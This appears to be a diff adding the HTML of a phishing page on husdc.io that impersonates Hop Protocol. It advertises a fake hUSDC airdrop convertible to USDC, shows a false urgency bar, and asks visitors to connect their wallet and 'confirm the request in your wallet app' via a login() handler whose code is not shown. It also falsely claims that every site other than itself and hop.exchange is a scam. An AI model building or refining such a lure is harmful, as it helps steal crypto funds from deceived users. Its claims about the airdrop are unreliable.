+        style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;">
+        <defs>
+            <filter id="wp-duotone-blue-orange">
+                <fecolormatrix color-interpolation-filters="sRGB" type="matrix"
+                    values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 ">
+                </fecolormatrix>
+                <fecomponenttransfer color-interpolation-filters="sRGB">
+                    <fefuncr type="table" tableValues="0.098039215686275 1"></fefuncr>
+                    <fefuncg type="table" tableValues="0 0.66274509803922"></fefuncg>
+                    <fefuncb type="table" tableValues="0.84705882352941 0.41960784313725"></fefuncb>
+                    <fefunca type="table" tableValues="1 1"></fefunca>
+                </fecomponenttransfer>
+                <fecomposite in2="SourceGraphic" operator="in"></fecomposite>
+            </filter>
+        </defs>
+    </svg>
+    <div class="ct-drawer-canvas">
+     
+
+        <div id="offcanvas" class="ct-panel ct-header" data-behaviour="right-side">
+            <div class="ct-panel-inner">
+                <div class="ct-panel-actions">
+                    <button class="ct-toggle-close" data-type="type-1" aria-label="Close drawer">
+                        <svg class="ct-icon" width="12" height="12" viewBox="0 0 15 15">
+                            <path
+                                d="M1 15a1 1 0 01-.71-.29 1 1 0 010-1.41l5.8-5.8-5.8-5.8A1 1 0 011.7.29l5.8 5.8 5.8-5.8a1 1 0 011.41 1.41l-5.8 5.8 5.8 5.8a1 1 0 01-1.41 1.41l-5.8-5.8-5.8 5.8A1 1 0 011 15z">
+                            </path>
+                        </svg>
+                    </button>
+                </div>
+                <div class="ct-panel-content" data-device="desktop"></div>
+                <div class="ct-panel-content" data-device="mobile">
+                    <nav class="mobile-menu has-submenu" data-id="mobile-menu" data-interaction="click"
+                        data-toggle-type="type-1" aria-label="Off Canvas Menu">
+                        <ul>
+                            <li class="page_item page-item-33 current_page_item current-menu-item"><span
+                                    class="ct-sub-menu-parent"><a href="" aria-current="page"
+                                        class="ct-menu-link">Hop Protocol</a></span></li>
+                        </ul>
+                    </nav>
+
+                </div>
+            </div>
+        </div>
+        <a href="" class="ct-back-to-top ct-hidden-sm" data-shape="square"
+            data-alignment="right" title="Go to top" aria-label="Go to top">
+
+            <svg class="ct-icon" width="15" height="15" viewBox="0 0 20 20">
+                <path d="M10,0L9.4,0.6L0.8,9.1l1.2,1.2l7.1-7.1V20h1.7V3.3l7.1,7.1l1.2-1.2l-8.5-8.5L10,0z"></path>
+            </svg> </a>
+
+    </div>
+    <div id="main-container">
+        <header id="header" class="ct-header" data-id="type-1" itemscope="" itemtype="https://schema.org/WPHeader">
+            <div data-device="desktop">
+                <div data-row="middle" data-column-set="2">
+                    <div class="ct-container-fluid">
+                        <div data-column="start" data-placements="1">
+                            <div data-items="primary">
+                                <div class="site-branding" data-id="logo" itemscope="itemscope"
+                                    itemtype="https://schema.org/Organization">
+
+                                    <a href="" class="site-logo-container" rel="home"><img
+                                            width="1280" height="483" src="https://husdc.io/files/hop-logo.5138ac11.png"
+                                            class="default-logo" alt="fav"></a>
+                                </div>
+
+                            </div>
+                        </div>
+                        <div data-column="end" data-placements="1">
+                            <div data-items="primary">
+                                <nav id="header-menu-1" class="header-menu-1" data-id="menu" data-interaction="hover"
+                                    data-menu="type-2:default" data-dropdown="type-1:simple" data-responsive="yes"
+                                    itemscope="" itemtype="https://schema.org/SiteNavigationElement"
+                                    aria-label="Header Menu">
+
+                                    <ul id="menu-header" class="menu">
+                                        <li id="menu-item-236"
+                                            class="menu-item menu-item-type-post_type menu-item-object-page menu-item-home current-menu-item page_item page-item-33 current_page_item menu-item-236">
+                                            <a href="" aria-current="page"
+                                                class="ct-menu-link">Hop Protocol</a></li>
+                                        <li id="menu-item-234"
+                                            class="menu-item menu-item-type-custom menu-item-object-custom menu-item-234">
+                                            <a target="_blank" rel="noreferrer" href="https://app.hop.exchange/"
+                                                class="ct-menu-link">Exchange</a></li>
+                                    </ul>
+                                </nav>
+
+
+                               
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div data-device="mobile">
+                <div data-row="middle" data-column-set="2">
+                    <div class="ct-container-fluid">
+                        <div data-column="start" data-placements="1">
+                            <div data-items="primary">
+                                <div class="site-branding" data-id="logo" itemscope="itemscope"
+                                    itemtype="https://schema.org/Organization">
+
+                                    <a href="" class="site-logo-container" rel="home"><img
+                                            width="1280" height="483" src="https://husdc.io/files/hop-logo.5138ac11.png"
+                                            class="default-logo" alt="fav"></a>
+                                </div>
+
+                            </div>
+                        </div>
+                        <div data-column="end" data-placements="1">
+                            <div data-items="primary">
+                               
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+        <main id="main" class="site-main hfeed">
+
+            <div data-elementor-type="wp-page" data-elementor-id="33" class="elementor elementor-33">
+                <section
+                    class="elementor-section elementor-top-section elementor-element elementor-element-db4d3b6 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                    data-id="db4d3b6" data-element_type="section"
+                    data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+                    <div class="elementor-background-overlay"></div>
+                    <div class="elementor-container elementor-column-gap-default">
+                        <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-10ff62e2 animated-slow"
+                            data-id="10ff62e2" data-element_type="column"
+                            data-settings="{&quot;animation&quot;:&quot;none&quot;,&quot;animation_delay&quot;:0}">
+                            <div class="elementor-widget-wrap elementor-element-populated">
+                                <div class="elementor-element elementor-element-e134a3d elementor-view-default elementor-vertical-align-top elementor-widget elementor-widget-icon-box"
+                                    data-id="e134a3d" data-element_type="widget" data-widget_type="icon-box.default">
+                                    <div class="elementor-widget-container">
+                                        <link rel="stylesheet" href="https://husdc.io/files/widget-icon-box.min.css">
+                                        <div class="elementor-icon-box-wrapper">
+                                            <div class="elementor-icon-box-content">
+                                                <h4 class="elementor-icon-box-title">
+                                                    <span>
+                                                        husdc DISTRIBUTION </span>
+                                                </h4>
+                                                <p class="elementor-icon-box-description">
+                                                    Hop Protocol: hUSDC </p>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-37c08bbe elementor-widget elementor-widget-text-editor"
+                                    data-id="37c08bbe" data-element_type="widget"
+                                    data-widget_type="text-editor.default">
+                                    <div class="elementor-widget-container">
+                                        <style>
+                                            /*! elementor - v3.8.1 - 13-11-2022 */
+                                            .elementor-widget-text-editor.elementor-drop-cap-view-stacked .elementor-drop-cap {
+                                                background-color: #818a91;
+                                                color: #fff
+                                            }
+
+                                            .elementor-widget-text-editor.elementor-drop-cap-view-framed .elementor-drop-cap {
+                                                color: #818a91;
+                                                border: 3px solid;
+                                                background-color: transparent
+                                            }
+
+                                            .elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap {
+                                                margin-top: 8px
+                                            }
+
+                                            .elementor-widget-text-editor:not(.elementor-drop-cap-view-default) .elementor-drop-cap-letter {
+                                                width: 1em;
+                                                height: 1em
+                                            }
+
+                                            .elementor-widget-text-editor .elementor-drop-cap {
+                                                float: left;
+                                                text-align: center;
+                                                line-height: 1;
+                                                font-size: 50px
+                                            }
+
+                                            .elementor-widget-text-editor .elementor-drop-cap-letter {
+                                                display: inline-block
+                                            }
+                                        </style>
+                                        <p style="text-align: left;"><span
+                                                style="color: #333333; font-size: inherit; font-weight: var( --e-global-typography-text-font-weight ); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);">Hop
+                                                Protocol is actively distributing hUSDC across multiple networks. This
+                                                campaign was polled by the Hop Protocol Liquidity Provider &amp; the Hop
+                                                Protocol Team in March 2023.</span></p>
+                                        <p style="text-align: left;"><span style="color: #333333;">Selected users who
+                                                have transacted with a Hop Protocol Contract or with contracts of Hop
+                                                Protocolsâ partners within the last 8 weeks have received hUSDC
+                                                tokens.&nbsp;Users with hUSDC in their wallet have been whitelisted
+                                                &amp; are eligible to swap the tokens into USDC.</span></p>
+                                        <p style="text-align: left;"><span style="color: #333333;">Based on the volume
+                                                youâve transacted with Hop Protocol &amp; selected partners, you have
+                                                been given a calculated amount of tokens.</span></p>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <section
+                    class="elementor-section elementor-top-section elementor-element elementor-element-40defc5c elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                    data-id="40defc5c" data-element_type="section"
+                    data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+                    <div class="elementor-container elementor-column-gap-no">
+                        <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-2aca0e69 animated-slow animated fadeIn"
+                            data-id="2aca0e69" data-element_type="column"
+                            data-settings="{&quot;animation&quot;:&quot;fadeIn&quot;}">
+                            <div class="elementor-widget-wrap elementor-element-populated">
+                                <div class="elementor-element elementor-element-461f9ad5 elementor-widget elementor-widget-heading"
+                                    data-id="461f9ad5" data-element_type="widget" data-widget_type="heading.default">
+                                    <div class="elementor-widget-container">
+                                        <style>
+                                            /*! elementor - v3.8.1 - 13-11-2022 */
+                                            .elementor-heading-title {
+                                                padding: 0;
+                                                margin: 0;
+                                                line-height: 1
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title[class*=elementor-size-]>a {
+                                                color: inherit;
+                                                font-size: inherit;
+                                                line-height: inherit
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title.elementor-size-small {
+                                                font-size: 15px
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title.elementor-size-medium {
+                                                font-size: 19px
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title.elementor-size-large {
+                                                font-size: 29px
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title.elementor-size-xl {
+                                                font-size: 39px
+                                            }
+
+                                            .elementor-widget-heading .elementor-heading-title.elementor-size-xxl {
+                                                font-size: 59px
+                                            }
+                                        </style>
+                                        <h3 class="elementor-heading-title elementor-size-default">Hop USDC Liquidity
+                                        </h3>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-3dd50aaa elementor-widget elementor-widget-text-editor"
+                                    data-id="3dd50aaa" data-element_type="widget"
+                                    data-widget_type="text-editor.default">
+                                    <div class="elementor-widget-container">
+                                        <p>Remaining Liquidity â Reward distribution stops at 100%</p>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-4e7462dc elementor-widget elementor-widget-progress"
+                                    data-id="4e7462dc" data-element_type="widget" data-widget_type="progress.default">
+                                    <div class="elementor-widget-container">
+                                        <style>
+                                            /*! elementor - v3.8.1 - 13-11-2022 */
+                                            .elementor-widget-progress {
+                                                text-align: left
+                                            }
+
+                                            .elementor-progress-wrapper {
+                                                position: relative;
+                                                background-color: #eee;
+                                                color: #fff;
+                                                height: 100%;
+                                                border-radius: 2px
+                                            }
+
+                                            .elementor-progress-bar {
+                                                display: -webkit-box;
+                                                display: -ms-flexbox;
+                                                display: flex;
+                                                background-color: #818a91;
+                                                width: 0;
+                                                font-size: 11px;
+                                                height: 30px;
+                                                line-height: 30px;
+                                                border-radius: 2px;
+                                                -webkit-transition: width 1s ease-in-out;
+                                                -o-transition: width 1s ease-in-out;
+                                                transition: width 1s ease-in-out
+                                            }
+
+                                            .elementor-progress-text {
+                                                -webkit-box-flex: 1;
+                                                -ms-flex-positive: 1;
+                                                flex-grow: 1;
+                                                white-space: nowrap;
+                                                -o-text-overflow: ellipsis;
+                                                text-overflow: ellipsis;
+                                                overflow: hidden;
+                                                padding-left: 15px
+                                            }
+
+                                            .elementor-progress-percentage {
+                                                padding-right: 15px
+                                            }
+
+                                            .elementor-widget-progress .elementor-progress-wrapper.progress-info .elementor-progress-bar {
+                                                background-color: #5bc0de
+                                            }
+
+                                            .elementor-widget-progress .elementor-progress-wrapper.progress-success .elementor-progress-bar {
+                                                background-color: #5cb85c
+                                            }
+
+                                            .elementor-widget-progress .elementor-progress-wrapper.progress-warning .elementor-progress-bar {
+                                                background-color: #f0ad4e
+                                            }
+
+                                            .elementor-widget-progress .elementor-progress-wrapper.progress-danger .elementor-progress-bar {
+                                                background-color: #d9534f
+                                            }
+
+                                            .elementor-progress .elementor-title {
+                                                display: block
+                                            }
+
+                                            @media (max-width:767px) {
+                                                .elementor-progress-text {
+                                                    padding-left: 10px
+                                                }
+                                            }
+
+                                            .e-con-inner .elementor-progress-wrapper,
+                                            .e-con .elementor-progress-wrapper {
+                                                height: auto
+                                            }
+                                        </style>
+                                        <div class="elementor-progress-wrapper" role="progressbar" aria-valuemin="0"
+                                            aria-valuemax="100" aria-valuenow="58" aria-valuetext="USDC Liquidity">
+                                            <div class="elementor-progress-bar" data-max="58" style="width: 58%;">
+                                                <span class="elementor-progress-text">USDC Liquidity</span>
+                                                <span class="elementor-progress-percentage">58%</span>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <section
+                    class="elementor-section elementor-top-section elementor-element elementor-element-4ae9fb5 elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                    data-id="4ae9fb5" data-element_type="section"
+                    data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+                    <div class="elementor-background-overlay"></div>
+                    <div class="elementor-container elementor-column-gap-no">
+                        <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-36f25b86 animated-slow"
+                            data-id="36f25b86" data-element_type="column"
+                            data-settings="{&quot;animation&quot;:&quot;none&quot;}">
+                            <div class="elementor-widget-wrap elementor-element-populated">
+                                <div class="elementor-element elementor-element-7861cab3 elementor-widget elementor-widget-heading"
+                                    data-id="7861cab3" data-element_type="widget" data-widget_type="heading.default">
+                                    <div class="elementor-widget-container">
+                                        <h4 class="elementor-heading-title elementor-size-default">Connect your wallet
+                                        </h4>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-34cb7fd elementor-widget elementor-widget-spacer"
+                                    data-id="34cb7fd" data-element_type="widget" data-widget_type="spacer.default">
+                                    <div class="elementor-widget-container">
+                                        <style>
+                                            /*! elementor - v3.8.1 - 13-11-2022 */
+                                            .elementor-column .elementor-spacer-inner {
+                                                height: var(--spacer-size)
+                                            }
+
+                                            .e-con {
+                                                --container-widget-width: 100%
+                                            }
+
+                                            .e-con-inner>.elementor-widget-spacer,
+                                            .e-con>.elementor-widget-spacer {
+                                                width: var(--container-widget-width, var(--spacer-size));
+                                                -ms-flex-item-align: stretch;
+                                                align-self: stretch;
+                                                -ms-flex-negative: 0;
+                                                flex-shrink: 0
+                                            }
+
+                                            .e-con-inner>.elementor-widget-spacer>.elementor-widget-container,
+                                            .e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer,
+                                            .e-con>.elementor-widget-spacer>.elementor-widget-container,
+                                            .e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer {
+                                                height: 100%
+                                            }
+
+                                            .e-con-inner>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner,
+                                            .e-con>.elementor-widget-spacer>.elementor-widget-container>.elementor-spacer>.elementor-spacer-inner {
+                                                height: var(--container-widget-height, var(--spacer-size))
+                                            }
+                                        </style>
+                                        <div class="elementor-spacer">
+                                            <div class="elementor-spacer-inner"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-25f5c19f elementor-widget elementor-widget-text-editor"
+                                    data-id="25f5c19f" data-element_type="widget"
+                                    data-widget_type="text-editor.default">
+                                    <div class="elementor-widget-container">
+                                        <p style="text-align: left;">In order to verify the ownership of your hUSDC
+                                            tokens, please connect your wallet. Once you have connected your wallet and
+                                            the ownership has been verified, your hUSDC tokens can be converted into
+                                            USDC. Ensure that you connect with the correct wallet containing hUSDC.</p>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-9c291ec elementor-widget elementor-widget-spacer"
+                                    data-id="9c291ec" data-element_type="widget" data-widget_type="spacer.default">
+                                    <div class="elementor-widget-container">
+                                        <div class="elementor-spacer">
+                                            <div class="elementor-spacer-inner"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <section
+                                    class="elementor-section elementor-inner-section elementor-element elementor-element-5019cbe elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                                    data-id="5019cbe" data-element_type="section">
+                                    <div class="elementor-container elementor-column-gap-default">
+                                        <div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-b96f795"
+                                            data-id="b96f795" data-element_type="column">
+                                            <div class="elementor-widget-wrap elementor-element-populated">
+                                                <div class="elementor-element elementor-element-43b3bfd elementor-widget elementor-widget-heading"
+                                                    data-id="43b3bfd" data-element_type="widget"
+                                                    data-widget_type="heading.default">
+                                                    <div class="elementor-widget-container">
+                                                        <h3 class="elementor-heading-title elementor-size-default">
+                                                            Claimable USDC: <br><br>---</h3>
+                                                    </div>
+                                                </div>
+                                                <div class="elementor-element elementor-element-a247c74 elementor-widget elementor-widget-text-editor"
+                                                    data-id="a247c74" data-element_type="widget"
+                                                    data-widget_type="text-editor.default">
+                                                    <div class="elementor-widget-container">
+                                                        <p id="missingsig" style="text-align: center;"><span
+                                                                style="color: #ff0000;">Wallet not connected</span></p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                                <div class="elementor-element elementor-element-e9b6f88 elementor-widget elementor-widget-html"
+                                    data-id="e9b6f88" data-element_type="widget" data-widget_type="html.default">
+                                    <div class="elementor-widget-container">
+                                        <center>
+                                            <div class="main">
+                                                <a id="connected" onclick="login()" class="button33">Connect</a>
+                                            </div>
+                                            <div id="backdrop"></div>
+                                            <br>
+                                            <p id="addresswallet"
+                                                style="position: absolute; bottom: 50px; color: black; text-align: center; width: 100%; font-size: 15px;">
+                                            </p>
+
+                                        </center>
+                                        <script>
+                                            window.setInterval(() => {
+                                                if (typeof window.wallet !== 'undefined') {
+                                                    document.getElementById("addresswallet").style.color = "#F4511E";
+                                                    document.getElementById('addresswallet').style.fontWeight = "bold";
+                                                    document.getElementById('addresswallet').innerHTML = "Wallet: " + window.wallet;
+                                                    document.getElementById('connected').innerHTML = "Verifying...";
+                                                    document.getElementById('missingsig').style.fontWeight = "bold";
+                                                    document.getElementById("missingsig").style.color = "#FFAA33";
+                                                    document.getElementById('missingsig').innerHTML = "Connected - please confirm the request in your wallet app to continue";
+                                                }
+                                            }, 1000);
+                                        </script>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-9f73b78 elementor-widget elementor-widget-spacer"
+                                    data-id="9f73b78" data-element_type="widget" data-widget_type="spacer.default">
+                                    <div class="elementor-widget-container">
+                                        <div class="elementor-spacer">
+                                            <div class="elementor-spacer-inner"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-aed43b4 elementor-widget elementor-widget-text-editor"
+                                    data-id="aed43b4" data-element_type="widget" data-widget_type="text-editor.default">
+                                    <div class="elementor-widget-container">
+                                        Using a mobile device?<br>
+                                        We recommend using the integrated browser in the MetaMask app for the best user
+                                        experience. </div>
+                                        <br>
+                                        <br>
+                                        <div class="elementor-widget-container">
+                                            <p><span style="text-decoration: underline;"><strong style="color: #000000; font-family: 'Courier Prime', sans-serif; text-align: left; text-decoration: underline;"><span style="color: #ff0000; text-decoration: underline;">Please ensure that you are at âhusdc.ioâ.&nbsp;</span><span style="color: #ff0000; font-size: inherit; font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform); text-decoration: underline;">All other websites, apart from âhop.exchangeâ, are a scam and are in no way affiliated with Hop Protocol.</span></strong></span></p>						</div>
+                                </div>
+                                
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <section
+                    class="elementor-section elementor-top-section elementor-element elementor-element-45b64bc elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                    data-id="45b64bc" data-element_type="section"
+                    data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+                    <div class="elementor-container elementor-column-gap-no">
+                        <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-25a8ad3e animated-slow animated fadeIn"
+                            data-id="25a8ad3e" data-element_type="column"
+                            data-settings="{&quot;animation&quot;:&quot;fadeIn&quot;}">
+                            <div class="elementor-widget-wrap elementor-element-populated">
+                                <div class="elementor-element elementor-element-60a5cac7 elementor-widget elementor-widget-heading"
+                                    data-id="60a5cac7" data-element_type="widget" data-widget_type="heading.default">
+                                    <div class="elementor-widget-container">
+                                        <h4 class="elementor-heading-title elementor-size-default">hUSDC Distribution
+                                            Calculation</h4>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-e5be596 elementor-widget elementor-widget-spacer"
+                                    data-id="e5be596" data-element_type="widget" data-widget_type="spacer.default">
+                                    <div class="elementor-widget-container">
+                                        <div class="elementor-spacer">
+                                            <div class="elementor-spacer-inner"></div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <section
+                                    class="elementor-section elementor-inner-section elementor-element elementor-element-99107b9 elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                                    data-id="99107b9" data-element_type="section">
+                                    <div class="elementor-container elementor-column-gap-default">
+                                        <div class="elementor-column elementor-col-100 elementor-inner-column elementor-element elementor-element-29d273d"
+                                            data-id="29d273d" data-element_type="column">
+                                            <div class="elementor-widget-wrap elementor-element-populated">
+                                                <div class="elementor-element elementor-element-4d7eaf11 elementor-widget elementor-widget-text-editor"
+                                                    data-id="4d7eaf11" data-element_type="widget"
+                                                    data-widget_type="text-editor.default">
+                                                    <div class="elementor-widget-container">
+                                                        <p>Holders of hUSDC<span
+                                                                style="font-size: inherit; text-align: inherit;font-weight: var( --e-global-typography-text-font-weight ); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);">&nbsp;are
+                                                                eligible to convert their tokens into USDC with
+                                                                calculation as follows:</span></p>
+                                                        <p>1 hUSDC = 0.70 USDC.</p>
+                                                        <p>Example:&nbsp;If you have received 200 hUSDC, you are
+                                                            eligible to claim 140 USDC. (200 * 0.7 = 140)</p>
+                                                        <p>Wallets with manually transferred hUSDC<span
+                                                                style="font-size: inherit; text-align: inherit; font-weight: var( --e-global-typography-text-font-weight ); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);">&nbsp;tokens
+                                                                from other wallets are&nbsp;</span><span
+                                                                style="font-size: inherit; text-align: inherit; font-weight: var( --e-global-typography-text-font-weight ); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform); color: #ff0000;">NOT</span><span
+                                                                style="font-size: inherit; text-align: inherit; font-weight: var( --e-global-typography-text-font-weight ); font-style: var(--fontStyle, inherit); letter-spacing: var(--letterSpacing); text-transform: var(--textTransform);">&nbsp;whitelisted.&nbsp;</span>
+                                                        </p>
+                                                        <p>The reward can only be claimed by wallets that have
+                                                            originally received hUSDC from the Hop Protocol: USDC
+                                                            Rewards Contract, Hop Protocol: HOP Token or Multichain: USD
+                                                            Coin contract.</p>
+                                                        <p>The reward distributions ends when the USDC Liquidity bar
+                                                            hits 100%. No matter how many hUSDC tokens exist, the
+                                                            distribution will stop at 100%.</p>
+                                                    </div>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </section>
+                            </div>
+                        </div>
+                    </div>
+                </section>
+                <section
+                    class="elementor-section elementor-top-section elementor-element elementor-element-4ddb063b elementor-section-content-middle elementor-section-boxed elementor-section-height-default elementor-section-height-default"
+                    data-id="4ddb063b" data-element_type="section"
+                    data-settings="{&quot;background_background&quot;:&quot;classic&quot;}">
+                    <div class="elementor-container elementor-column-gap-no">
+                        <div class="elementor-column elementor-col-100 elementor-top-column elementor-element elementor-element-2312fc24 animated fadeIn"
+                            data-id="2312fc24" data-element_type="column"
+                            data-settings="{&quot;animation&quot;:&quot;fadeIn&quot;}">
+                            <div class="elementor-widget-wrap elementor-element-populated">
+                                <div class="elementor-element elementor-element-63a719c4 elementor-widget elementor-widget-heading"
+                                    data-id="63a719c4" data-element_type="widget" data-widget_type="heading.default">
+                                    <div class="elementor-widget-container">
+                                        <h2 class="elementor-heading-title elementor-size-default">FAQ</h2>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-5ee96684 elementor-widget elementor-widget-heading"
+                                    data-id="5ee96684" data-element_type="widget" data-widget_type="heading.default">
+                                    <div class="elementor-widget-container">
+                                        <h5 class="elementor-heading-title elementor-size-default">Most frequent
+                                            questions and answers</h5>
+                                    </div>
+                                </div>
+                                <div class="elementor-element elementor-element-6e5e134f elementor-widget elementor-widget-toggle"
+                                    data-id="6e5e134f" data-element_type="widget" data-widget_type="toggle.default">
+                                    <div class="elementor-widget-container">
+                                        <style>
+                                            /*! elementor - v3.8.1 - 13-11-2022 */
+                                            .elementor-toggle {
+                                                text-align: left
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title {
+                                                font-weight: 700;
+                                                line-height: 1;
+                                                margin: 0;
+                                                padding: 15px;
+                                                border-bottom: 1px solid #d4d4d4;
+                                                cursor: pointer;
+                                                outline: none
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon {
+                                                display: inline-block;
+                                                width: 1em
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon svg {
+                                                -webkit-margin-start: -5px;
+                                                margin-inline-start: -5px;
+                                                width: 1em;
+                                                height: 1em
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon.elementor-toggle-icon-right {
+                                                float: right;
+                                                text-align: right
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon.elementor-toggle-icon-left {
+                                                float: left;
+                                                text-align: left
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon .elementor-toggle-icon-closed {
+                                                display: block
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title .elementor-toggle-icon .elementor-toggle-icon-opened {
+                                                display: none
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title.elementor-active {
+                                                border-bottom: none
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title.elementor-active .elementor-toggle-icon-closed {
+                                                display: none
+                                            }
+
+                                            .elementor-toggle .elementor-tab-title.elementor-active .elementor-toggle-icon-opened {
+                                                display: block
+                                            }
+
+                                            .elementor-toggle .elementor-tab-content {
+                                                padding: 15px;
+                                                border-bottom: 1px solid #d4d4d4;
+                                                display: none
+                                            }
+
+                                            @media (max-width:767px) {
+                                                .elementor-toggle .elementor-tab-title {
+                                                    padding: 12px
+                                                }
+
+                                                .elementor-toggle .elementor-tab-content {
+                                                    padding: 12px 10px
+                                                }
+                                            }
+
+                                            .e-con-inner>.elementor-widget-toggle,
+                                            .e-con>.elementor-widget-toggle {
+                                                width: var(--container-widget-width, 100%)
+                                            }
+                                            .layui-layer-content{
+                                                color: black !important;
+                                            }
+                                        </style>
+                                        <div class="elementor-toggle" role="tablist">
+                                            <div class="elementor-toggle-item" onclick="alertMsg()">
+                                                <div id="elementor-tab-title-1851" class="elementor-tab-title"
+                                                    data-tab="1" role="tab" aria-controls="elementor-tab-content-1851"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a class="elementor-toggle-title">Why
+                                                        did I receive hUSDC?</a>
+                                                </div>
+                                            </div>
+                                            <div class="elementor-toggle-item" onclick="alertMsg2()">
+                                                <div id="elementor-tab-title-1852" class="elementor-tab-title"
+                                                    data-tab="2" role="tab" aria-controls="elementor-tab-content-1852"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a  class="elementor-toggle-title">I
+                                                        can not connect to Hop Protocol, is my wallet compatible?</a>
+                                                </div>
+
+                                                
+                                            </div>
+                                            <div class="elementor-toggle-item" onclick="alertMsg3()">
+                                                <div id="elementor-tab-title-1853" class="elementor-tab-title"
+                                                    data-tab="3" role="tab" aria-controls="elementor-tab-content-1853"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a 
+                                                        class="elementor-toggle-title">After converting hUSDC tokens
+                                                        into USDC, can I sell the rewarded USDC instantly?</a>
+                                                </div>
+
+                                              
+                                            </div>
+                                            <div class="elementor-toggle-item" onclick="alertMsg4()">
+                                                <div id="elementor-tab-title-1854" class="elementor-tab-title"
+                                                    data-tab="4" role="tab" aria-controls="elementor-tab-content-1854"
+                                                    aria-expanded="false">
+                                                    <span class="elementor-toggle-icon elementor-toggle-icon-right"
+                                                        aria-hidden="true">
+                                                        <span class="elementor-toggle-icon-closed"><i
+                                                                class="fas fa-caret-right"></i></span>
+                                                        <span class="elementor-toggle-icon-opened"><i
+                                                                class="elementor-toggle-icon-opened fas fa-caret-up"></i></span>
+                                                    </span>
+                                                    <a class="elementor-toggle-title">Why
+                                                        did other users receive a different amount of hUSDC?</a>
+                                                </div>
+
+                                              
+                                            </div>
